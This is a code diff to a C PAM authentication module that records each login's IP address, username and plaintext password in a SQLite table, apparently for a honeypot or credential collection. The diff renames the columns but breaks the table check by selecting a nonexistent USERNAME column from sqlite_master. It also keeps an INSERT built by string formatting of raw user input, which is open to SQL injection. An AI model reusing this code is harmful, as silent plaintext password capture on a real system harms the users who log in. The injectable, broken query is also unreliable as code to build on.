@@ -75,18 +75,18 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     
     /* This line checks if the database file exists, and if it has a passwords table*/
     int exists = 0;
-    ret = sqlite3_exec(database.db, "SELECT name FROM sqlite_master WHERE type='table' AND name='passwords';", table_exists, &exists, NULL);
+    ret = sqlite3_exec(database.db, "SELECT USERNAME FROM sqlite_master WHERE type='table' AND name='passwords';", table_exists, &exists, NULL);
     if (!exists) {
         /* If the table does not exist, then create the SQLite3 database file and table */
         _pam_log(LOG_ERR,"Creating passwords table");
-        ret = sqlite3_exec(database.db, "CREATE TABLE passwords(time INTEGER, nano INTEGER, ip TEXT, username TEXT, password TEXT, PRIMARY KEY (time,nano));", NULL, NULL, NULL);
+        ret = sqlite3_exec(database.db, "CREATE TABLE passwords(TIMESTAMP_SECS INTEGER, TIMESTAMP_NANO INTEGER, IP_ADDRESS TEXT, USERNAME TEXT, PASSWORD TEXT, PRIMARY KEY (TIMESTAMP_SECS,TIMESTAMP_NANO));", NULL, NULL, NULL);
     }
     
     /* Get a timestamp to record time of password collect */
     gettimeofday(&tv, NULL);
     
     /* Create the database command with all of the pertinent data */
-    ret = snprintf(command, BUF_MAX-1, "INSERT INTO passwords(time,nano,ip,username,password) VALUES(%lu,%lu,'%s','%s','%s');", tv.tv_sec, tv.tv_usec, ip, uname, pword);
+    ret = snprintf(command, BUF_MAX-1, "INSERT INTO passwords(TIMESTAMP_SECS,TIMESTAMP_NANO,IP_ADDRESS,USERNAME,PASSWORD) VALUES(%lu,%lu,'%s','%s','%s');", tv.tv_sec, tv.tv_usec, ip, uname, pword);
     
     /* Execute the command */
     ret = sqlite3_exec(database.db, command, NULL, NULL, NULL);
